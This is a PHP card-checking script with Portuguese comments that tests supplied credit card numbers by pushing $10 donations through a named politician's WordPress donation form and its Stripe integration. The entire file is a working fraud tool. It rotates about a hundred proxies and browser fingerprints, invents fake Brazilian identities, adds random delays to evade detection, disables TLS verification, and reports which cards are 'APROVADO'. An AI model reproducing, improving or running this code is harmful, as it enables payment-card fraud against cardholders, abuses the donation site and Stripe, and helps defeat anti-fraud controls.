<?php
// ==========================================
// ===== ANTI-DETECÇÃO COMPLETA =====
// ==========================================

header('Content-Type: application/json');
error_reporting(0);

// ===== CONFIGURAÇÕES =====
$debug = isset($_GET['debug']) ? true : false;
$proxyManual = isset($_GET['proxy']) ? $_GET['proxy'] : null;

// ===== LISTA DE PROXYS =====
$proxyList = [
    '216.26.255.41:3129', '216.26.248.253:3129', '104.207.41.177:3129',
    '216.26.226.254:3129', '65.111.23.240:3129', '209.50.167.111:3129',
    '209.50.185.239:3129', '65.111.30.7:3129', '104.207.45.58:3129',
    '209.50.172.55:3129', '104.207.58.175:3129', '65.111.24.228:3129',
    '45.3.36.188:3129', '216.26.246.200:3129', '104.207.45.160:3129',
    '45.3.34.99:3129', '65.111.23.15:3129', '216.26.237.65:3129',
    '195.63.31.155:3129', '45.3.41.223:3129', '65.111.28.4:3129',
    '65.111.4.234:3129', '216.26.251.254:3129', '65.111.3.0:3129',
    '216.26.251.124:3129', '45.3.55.132:3129', '104.207.57.20:3129',
    '45.3.49.198:3129', '104.207.33.208:3129', '216.26.251.195:3129',
    '104.207.63.50:3129', '65.111.9.154:3129', '216.26.244.144:3129',
    '216.26.253.178:3129', '216.26.229.0:3129', '216.26.231.101:3129',
    '45.3.62.108:3129', '104.207.34.205:3129', '209.50.165.71:3129',
    '45.3.43.46:3129', '216.26.254.54:3129', '104.207.63.171:3129',
    '65.111.9.254:3129', '45.3.44.205:3129', '45.3.42.33:3129',
    '45.3.62.143:3129', '209.50.183.22:3129', '104.207.58.251:3129',
    '209.50.162.144:3129', '209.50.182.187:3129', '104.207.51.194:3129',
    '65.111.30.180:3129', '65.111.11.140:3129', '209.50.184.60:3129',
    '209.50.186.169:3129', '209.50.184.13:3129', '209.50.170.93:3129',
    '209.50.163.116:3129', '209.50.179.222:3129', '209.50.164.202:3129',
    '104.207.37.185:3129', '45.3.43.58:3129', '209.50.189.248:3129',
    '45.3.53.160:3129', '45.3.36.193:3129', '65.111.13.218:3129',
    '104.207.36.253:3129', '209.50.166.187:3129', '217.181.90.136:3129',
    '216.26.229.189:3129', '45.3.39.26:3129', '209.50.176.1:3129',
    '216.26.247.168:3129', '65.111.7.0:3129', '104.207.51.19:3129',
    '216.26.246.2:3129', '209.50.185.131:3129', '104.207.39.206:3129',
    '209.50.169.30:3129', '216.26.250.177:3129', '65.111.14.202:3129',
    '209.50.175.250:3129', '216.26.233.196:3129', '209.50.183.239:3129',
    '209.50.170.80:3129', '104.207.35.34:3129', '45.3.40.160:3129',
    '209.50.163.107:3129', '45.3.55.235:3129', '209.50.189.255:3129',
    '209.50.178.232:3129', '216.26.234.232:3129', '209.50.191.116:3129',
    '195.63.31.212:3129', '45.3.62.229:3129', '104.207.42.219:3129',
    '45.3.46.41:3129', '216.26.238.127:3129', '45.3.49.74:3129',
    '209.50.171.61:3129'
];

// ===== LISTA DE USER-AGENTS =====
$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
];

// ===== LISTA DE ACCEPT-LANGUAGE =====
$acceptLanguages = [
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9,pt;q=0.8',
    'pt-BR,pt;q=0.9,en;q=0.8',
    'en-US,en;q=0.9,pt-BR;q=0.8',
    'pt,en;q=0.9,en-US;q=0.8'
];

// ===== DADOS REALISTAS =====
$nomes = ['João', 'Maria', 'Pedro', 'Ana', 'Lucas', 'Julia', 'Carlos', 'Fernanda', 'Rafael', 'Beatriz', 'Gabriel', 'Mariana'];
$sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Pereira', 'Costa', 'Ferreira', 'Rodrigues', 'Almeida'];
$cidades = ['São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza', 'Brasília', 'Recife', 'Manaus'];
$estados = ['SP', 'RJ', 'MG', 'PR', 'RS', 'BA', 'CE', 'DF', 'PE', 'AM'];
$ruas = ['Rua Bonfim', 'Avenida Paulista', 'Rua Augusta', 'Alameda Santos', 'Rua Oscar Freire', 'Avenida Brasil', 'Rua das Flores', 'Avenida Atlântica'];
$complementos = ['Apto', 'Casa', 'Bloco', 'Sala', 'Conjunto'];

// ==========================================
// ===== FUNÇÕES =====
// ==========================================

function getRandomProxy($proxyList) {
    shuffle($proxyList);
    return $proxyList[array_rand($proxyList)];
}

function getRandomUserAgent($userAgents) {
    return $userAgents[array_rand($userAgents)];
}

function getRandomAcceptLanguage($acceptLanguages) {
    return $acceptLanguages[array_rand($acceptLanguages)];
}

function getNewCookieFile() {
    return sys_get_temp_dir() . '/cookie_' . uniqid() . '_' . rand(1000, 99999) . '.txt';
}

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    if (!isset($str[1])) return '';
    $str = explode($end, $str[1]);
    return $str[0];
}

function gerarDadosRealistas($nomes, $sobrenomes, $cidades, $estados, $ruas, $complementos) {
    return [
        'nome' => $nomes[array_rand($nomes)],
        'sobrenome' => $sobrenomes[array_rand($sobrenomes)],
        'cidade' => $cidades[array_rand($cidades)],
        'estado' => $estados[array_rand($estados)],
        'cep' => rand(10000, 99999),
        'rua' => $ruas[array_rand($ruas)] . ', ' . rand(100, 999),
        'complemento' => $complementos[array_rand($complementos)] . ' ' . rand(1, 50),
        'telefone' => '+55' . rand(11, 99) . '9' . rand(10000000, 99999999)
    ];
}

// ===== FUNÇÃO PARA CRIAR CURL COM CONFIGURAÇÕES ANTI-DETECÇÃO =====
function setupCurl($url, $proxy, $ua, $cookieFile, $headers = [], $postFields = null, $isStripe = false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    
    // ===== ANTI-DETECÇÃO: Headers realistas =====
    $defaultHeaders = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language: ' . getRandomAcceptLanguage($GLOBALS['acceptLanguages']),
        'Accept-Encoding: gzip, deflate, br',
        'Connection: keep-alive',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: none',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'Cache-Control: max-age=0',
        'Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile: ?0',
        'Sec-Ch-Ua-Platform: "Windows"'
    ];
    
    if (!empty($headers)) {
        $defaultHeaders = array_merge($defaultHeaders, $headers);
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $defaultHeaders);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate, br');
    
    // ===== ANTI-DETECÇÃO: TLS Fingerprint diferente =====
    // Força versão específica do TLS
    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
    
    // ===== POST =====
    if ($postFields !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    }
    
    return $ch;
}

// ==========================================
// ===== PARAMETROS =====
// ==========================================

$lista = isset($_GET['lista']) ? $_GET['lista'] : '';

if (empty($lista)) {
    echo json_encode(['error' => 'Use: ?lista=cc|mes|ano|cvv']);
    exit;
}

$dados = explode('|', $lista);
if (count($dados) < 4) {
    echo json_encode(['error' => 'Formato: ?lista=cc|mes|ano|cvv']);
    exit;
}

$cc = trim(str_replace(' ', '', $dados[0]));
$mes = trim($dados[1]);
$ano = substr(trim($dados[2]), -2);
$cvv = trim($dados[3]);
$anoFull = '20' . $ano;

if ($debug) {
    echo "========== DEBUG MODE ==========\n";
    echo "IP do Servidor: " . ($_SERVER['SERVER_ADDR'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1') . "\n";
    echo "IP do Cliente: " . ($_SERVER['REMOTE_ADDR'] ?? '127.0.0.1') . "\n";
    echo "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Desconhecido') . "\n";
    echo "================================\n\n";
}

// ==========================================
// ===== DELAY ALEATÓRIO (ANTI-DETECÇÃO) =====
// ==========================================
sleep(rand(1, 3));

// ==========================================
// ===== REQUISIÇÃO 1 =====
// ==========================================
$proxy1 = $proxyManual ?: getRandomProxy($proxyList);
$ua1 = getRandomUserAgent($userAgents);
$cookie1 = getNewCookieFile();
$email = strtolower(uniqid() . '.' . rand(100, 999) . '@' . ['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'][array_rand(['gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com'])]);

if ($debug) {
    echo "Proxy 1: $proxy1\n";
    echo "User-Agent 1: $ua1\n";
    echo "Cookie 1: $cookie1\n\n";
}

$ch = setupCurl(
    'https://richardraymond.com/donate-with-credit-card/',
    $proxy1,
    $ua1,
    $cookie1,
    ['Host: richardraymond.com']
);

$html = curl_exec($ch);
$error1 = curl_error($ch);
$info1 = curl_getinfo($ch);
curl_close($ch);

if ($error1 || empty($html)) {
    echo json_encode(['error' => 'Falha na requisição 1', 'debug' => $error1]);
    @unlink($cookie1);
    exit;
}

if ($debug) {
    echo "Status HTTP 1: " . ($info1['http_code'] ?? 'N/A') . "\n";
    echo "Erro 1: " . ($error1 ?: 'Nenhum') . "\n\n";
}

// ==========================================
// ===== REQUISIÇÃO 2 - Stripe =====
// ==========================================
sleep(rand(1, 2));

$proxy2 = $proxyManual ?: getRandomProxy($proxyList);
$ua2 = getRandomUserAgent($userAgents);
$cookie2 = getNewCookieFile();

if ($debug) {
    echo "Proxy 2: $proxy2\n";
    echo "User-Agent 2: $ua2\n\n";
}

$session_id = 'elements_session_' . substr(uniqid(), 0, 10);
$stripe_js_id = sprintf('%08x-%04x-%04x-%04x-%012x', 
    mt_rand(0, 0xffffffff), 
    mt_rand(0, 0xffff), 
    mt_rand(0, 0xffff), 
    mt_rand(0, 0xffff), 
    mt_rand(0, 0xffffffffffff)
);

$ch = setupCurl(
    'https://api.stripe.com/v1/elements/sessions?client_betas[0]=elements_enable_deferred_intent_beta_1&deferred_intent[mode]=payment&deferred_intent[amount]=1000&deferred_intent[currency]=usd&key=pk_live_51NiR3lDYjZxxDRAkAE2fpwUWba77EFokLLc3mLuCzzh5LdJ3dva2SbAHCW1Y9EJSjUUBNvB6G3kmY1lGbgT97Dny00DZ6qUBX8&elements_init_source=stripe.elements&referrer_host=richardraymond.com&session_id=' . $session_id . '&stripe_js_id=' . $stripe_js_id . '&locale=en&type=deferred_intent',
    $proxy2,
    $ua2,
    $cookie2,
    [
        'Host: api.stripe.com',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Referer: https://js.stripe.com/',
        'Sec-Fetch-Site: same-site',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty'
    ]
);

$session_response = curl_exec($ch);
$error2 = curl_error($ch);
curl_close($ch);

if ($error2 || empty($session_response)) {
    echo json_encode(['error' => 'Falha na Stripe', 'debug' => $error2]);
    @unlink($cookie1);
    @unlink($cookie2);
    exit;
}

$session_data = json_decode($session_response, true);
$elements_session_config_id = $session_data['id'] ?? $session_data['elements_session_config_id'] ?? '';
if (empty($elements_session_config_id)) {
    $elements_session_config_id = $session_id . '_config';
}

// ==========================================
// ===== REQUISIÇÃO 3 - Envia Cartão =====
// ==========================================
sleep(rand(2, 4));

$proxy3 = $proxyManual ?: getRandomProxy($proxyList);
$ua3 = getRandomUserAgent($userAgents);
$cookie3 = getNewCookieFile();
$dadosPessoa = gerarDadosRealistas($nomes, $sobrenomes, $cidades, $estados, $ruas, $complementos);

if ($debug) {
    echo "Proxy 3: $proxy3\n";
    echo "User-Agent 3: $ua3\n";
    echo "Dados: " . json_encode($dadosPessoa) . "\n\n";
}

$time_on_page = rand(45000, 120000);
$payload = 'type=card&card[number]=' . urlencode($cc) . 
           '&card[cvc]=' . $cvv . 
           '&card[exp_year]=' . $anoFull . 
           '&card[exp_month]=' . $mes . 
           '&allow_redisplay=unspecified' .
           '&billing_details[address][line1]=' . urlencode($dadosPessoa['rua']) .
           '&billing_details[address][line2]=' . urlencode($dadosPessoa['complemento']) .
           '&billing_details[address][city]=' . urlencode($dadosPessoa['cidade']) .
           '&billing_details[address][state]=' . $dadosPessoa['estado'] .
           '&billing_details[address][postal_code]=' . $dadosPessoa['cep'] .
           '&billing_details[address][country]=BR' .
           '&billing_details[name]=' . urlencode($dadosPessoa['nome'] . ' ' . $dadosPessoa['sobrenome']) .
           '&billing_details[email]=' . urlencode($email) .
           '&billing_details[phone]=' . urlencode($dadosPessoa['telefone']) .
           '&payment_user_agent=stripe.js%2F39914d4bef%3B+stripe-js-v3%2F39914d4bef%3B+payment-element%3B+deferred-intent%3B+autopm' .
           '&referrer=https%3A%2F%2Frichardraymond.com' .
           '&time_on_page=' . $time_on_page .
           '&client_attribution_metadata[client_session_id]=' . $stripe_js_id .
           '&client_attribution_metadata[merchant_integration_source]=elements' .
           '&client_attribution_metadata[merchant_integration_subtype]=payment-element' .
           '&client_attribution_metadata[merchant_integration_version]=2021' .
           '&client_attribution_metadata[payment_intent_creation_flow]=deferred' .
           '&client_attribution_metadata[payment_method_selection_flow]=automatic' .
           '&client_attribution_metadata[elements_session_id]=' . $session_id .
           '&client_attribution_metadata[elements_session_config_id]=' . $elements_session_config_id .
           '&client_attribution_metadata[merchant_integration_additional_elements][0]=payment' .
           '&client_attribution_metadata[merchant_integration_additional_elements][1]=linkAuthentication' .
           '&guid=NA&muid=NA&sid=NA' .
           '&key=pk_live_51NiR3lDYjZxxDRAkAE2fpwUWba77EFokLLc3mLuCzzh5LdJ3dva2SbAHCW1Y9EJSjUUBNvB6G3kmY1lGbgT97Dny00DZ6qUBX8';

$ch = setupCurl(
    'https://api.stripe.com/v1/payment_methods',
    $proxy3,
    $ua3,
    $cookie3,
    [
        'Host: api.stripe.com',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'Origin: https://js.stripe.com',
        'Sec-Fetch-Site: same-site',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://js.stripe.com/'
    ],
    $payload,
    true
);

$response = curl_exec($ch);
$error3 = curl_error($ch);
curl_close($ch);

if ($error3 || empty($response)) {
    echo json_encode(['error' => 'Falha ao criar payment method', 'debug' => $error3]);
    @unlink($cookie1);
    @unlink($cookie2);
    @unlink($cookie3);
    exit;
}

$pm = getStr($response, '"id": "', '"');

if (empty($pm)) {
    $stripeError = json_decode($response, true);
    $mensagemErro = $stripeError['error']['message'] ?? 'Erro desconhecido';
    echo json_encode(['error' => 'Stripe recusou: ' . $mensagemErro, 'response' => $stripeError]);
    @unlink($cookie1);
    @unlink($cookie2);
    @unlink($cookie3);
    exit;
}

// ==========================================
// ===== REQUISIÇÃO 4 - Segunda página =====
// ==========================================
sleep(rand(1, 3));

$proxy4 = $proxyManual ?: getRandomProxy($proxyList);
$ua4 = getRandomUserAgent($userAgents);
$cookie4 = getNewCookieFile();

if ($debug) {
    echo "Proxy 4: $proxy4\n";
    echo "User-Agent 4: $ua4\n\n";
}

$ch = setupCurl(
    'https://richardraymond.com/donate-with-credit-card/',
    $proxy4,
    $ua4,
    $cookie4,
    [
        'Host: richardraymond.com',
        'Referer: https://richardraymond.com/78-2/',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Dest: document'
    ]
);

$html2 = curl_exec($ch);
$error4 = curl_error($ch);
curl_close($ch);

if ($error4 || empty($html2)) {
    echo json_encode(['error' => 'Falha na requisição 4', 'debug' => $error4]);
    @unlink($cookie1);
    @unlink($cookie2);
    @unlink($cookie3);
    @unlink($cookie4);
    exit;
}

$token = getStr($html2, 'wpforms[token]" value="', '"');
if (empty($token)) {
    $token = getStr($html2, "wpforms[token]\" value=\"", "\"");
}
if (empty($token)) {
    $token = '91bda1801a3920625567d0a973d2ba46';
}

// ==========================================
// ===== REQUISIÇÃO 5 - Envio final =====
// ==========================================
sleep(rand(2, 5));

$proxy5 = $proxyManual ?: getRandomProxy($proxyList);
$ua5 = getRandomUserAgent($userAgents);
$cookie5 = getNewCookieFile();
$dadosForm = gerarDadosRealistas($nomes, $sobrenomes, $cidades, $estados, $ruas, $complementos);

if ($debug) {
    echo "Proxy 5: $proxy5\n";
    echo "User-Agent 5: $ua5\n\n";
}

$startTimestamp = time();
$endTimestamp = time() + rand(45, 150);

$wpfuj = json_encode([
    (string)($startTimestamp - 500) => "https%3A%2F%2Frichardraymond.com%2Fdonate-with-credit-card%2F%7C%23%7CDonate%20With%20Credit%20Card%20%E2%80%93%20Rep.%20Richard%20Pe%C3%B1a%20Raymond%7C%23%7C956",
    (string)$startTimestamp => "https%3A%2F%2Frichardraymond.com%2Fdonate-with-credit-card%2F%7C%23%7CDonate%20With%20Credit%20Card%20%E2%80%93%20Rep.%20Richard%20Pe%C3%B1a%20Raymond%7C%23%7C956"
]);

$boundary = '----WebKitFormBoundary' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 16);

$payload1 = '--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][1]"

' . $email . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][0][first]"

' . $dadosForm['nome'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][0][last]"

' . $dadosForm['sobrenome'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][15][address1]"

' . $dadosForm['rua'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][15][address2]"

' . $dadosForm['complemento'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][15][city]"

' . $dadosForm['cidade'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][15][state]"

' . $dadosForm['estado'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][15][postal]"

' . $dadosForm['cep'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][11]"

' . $dadosForm['telefone'] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][3]"

1
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][7]"


--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][16]"

Yes
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][18]"


--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][19]"


--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][4]"

$10.00
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[fields][21]"

' . ['Apoio ao projeto', 'Doação voluntária', 'Contribuição', 'Suporte à causa', 'Ajuda comunitária'][array_rand(['Apoio ao projeto', 'Doação voluntária', 'Contribuição', 'Suporte à causa', 'Ajuda comunitária'])] . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[id]"

941
--' . $boundary . '
Content-Disposition: form-data; name="page_title"

Donate With Credit Card
--' . $boundary . '
Content-Disposition: form-data; name="page_url"

https://richardraymond.com/donate-with-credit-card/
--' . $boundary . '
Content-Disposition: form-data; name="url_referer"


--' . $boundary . '
Content-Disposition: form-data; name="page_id"

956
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[post_id]"

956
--' . $boundary . '
Content-Disposition: form-data; name="_wpfuj"

' . $wpfuj . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[token]"

' . $token . '
--' . $boundary . '
Content-Disposition: form-data; name="wpforms[payment_method_id]"

' . $pm . '
--' . $boundary . '
Content-Disposition: form-data; name="action"

wpforms_submit
--' . $boundary . '
Content-Disposition: form-data; name="start_timestamp"

' . $startTimestamp . '
--' . $boundary . '
Content-Disposition: form-data; name="end_timestamp"

' . $endTimestamp . '
--' . $boundary . '--
';

$ch = setupCurl(
    'https://richardraymond.com/wp-admin/admin-ajax.php',
    $proxy5,
    $ua5,
    $cookie5,
    [
        'Host: richardraymond.com',
        'X-Requested-With: XMLHttpRequest',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: multipart/form-data; boundary=' . $boundary,
        'Origin: https://richardraymond.com',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://richardraymond.com/donate-with-credit-card/'
    ],
    $payload1
);

$response2 = curl_exec($ch);
$error5 = curl_error($ch);
curl_close($ch);

// ===== LIMPEZA =====
@unlink($cookie1);
@unlink($cookie2);
@unlink($cookie3);
@unlink($cookie4);
@unlink($cookie5);

if ($error5) {
    echo json_encode(['error' => 'Falha no envio final', 'debug' => $error5]);
    exit;
}

$result = json_decode($response2, true);

$mensagem = $result['data']['errors']['general']['header'] ?? 
            $result['data']['errors']['general']['footer'] ?? 
            $result['data']['errors']['general'] ?? 
            $result['data']['message'] ?? 
            ($result['success'] ? '✅ APROVADO!' : 'Resposta desconhecida');

$mensagem = strip_tags($mensagem);
$mensagem = trim($mensagem);

$tempo = round(microtime(true) - $_SERVER["REQUEST_TIME_FLOAT"], 1);

if ($debug) {
    echo "========== RESULTADO ==========\n";
    echo "PM ID: $pm\n";
    echo "Token: $token\n";
    echo "Dados: " . json_encode($dadosPessoa) . "\n";
    echo "Resposta: " . $response2 . "\n\n";
}

echo "cyber ➤ $cc|$mes|$anoFull|$cvv ➤ $mensagem ➤ BY: MISANTROPIA#CYBERSEC ➤ ⏱️ {$tempo}s ➤ 🌐 Proxy: $proxy1";
?>